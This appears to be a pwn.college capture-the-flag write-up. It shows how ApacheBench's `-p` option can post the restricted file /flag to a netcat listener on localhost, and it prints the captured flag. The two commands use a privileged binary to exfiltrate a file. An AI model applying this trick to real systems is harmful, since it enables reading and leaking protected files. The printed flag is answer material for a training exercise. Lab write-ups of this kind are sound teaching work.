---
title: "ab: pwn.college"
date: 2026-10-18
categories: [CTF, pwn.college]
tags: [ctf, pwn-college, ab]
---
# ab: pwn.college


The `ab -h` output confirms that `-p` supplies a POST body and `-T` sets its content type.
![Screenshot](images/Pasted%20image%2020261009153744.png)
I started the listener in the background so I could run **ab** in the same shell. Then I sent one POST request with `/flag` as the body:
```bash
nc -lnvp 9000 & disown
ab -n1 -p /flag -T x http://localhost:9000/
```
![Screenshot](images/Pasted%20image%2020261009153657.png)

I didn't save the sudo or file permission output, so I can't show why **ab** could read `/flag`. The POST request only sends a file the program can already open.


**Flag:**

```
pwn.college{sWzakHalnnJ4NfVyDHPK3d7WySo.0lM5YDMywCO4YDM5EzW}
```


## Findings

I used **ab** to send `/flag` as the body of a web request and caught it with a listener. My notes include the challenge flag, but not the permission that let **ab** read `/flag`. I need the **sudo** or file permission output to show that part of the solution.

## What I Learned

The **ab** options made more sense once I checked them: `-p` reads the request body from a file, and `-T` sets its content type ([ApacheBench guide](https://httpd.apache.org/docs/2.4/programs/ab.html)). The listener can only receive files the local program is allowed to read. The [pwn.college challenge](https://pwn.college/) provides the setting for this exercise.
